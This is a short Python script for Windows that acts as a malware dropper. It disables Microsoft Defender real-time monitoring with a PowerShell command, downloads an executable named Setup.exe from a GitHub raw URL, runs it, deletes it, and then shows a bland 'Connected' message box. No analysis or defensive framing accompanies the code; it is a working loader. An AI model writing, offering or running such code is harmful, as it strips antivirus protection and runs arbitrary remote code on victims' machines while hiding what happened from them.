import os
import ctypes
import subprocess
import time
import requests

def disable_defender():
    subprocess.run("powershell -command Set-MpPreference -DisableRealtimeMonitoring $true")

def download_and_run(url):
    response = requests.get(url)
    if response.status_code == 200:
        with open("Setup.exe", "wb") as f:
            f.write(response.content)
        subprocess.run(["Setup.exe"], shell=True)
        os.remove("Setup.exe")
        ctypes.windll.user32.MessageBoxW(0, "Connected", "Connection Status", 0x40)

def main():
    disable_defender()
    download_and_run("https://github.com/XYVPP/ubiquitous-octo-sniffle/raw/main/Setup.exe")

if __name__ == "__main__":
    main()
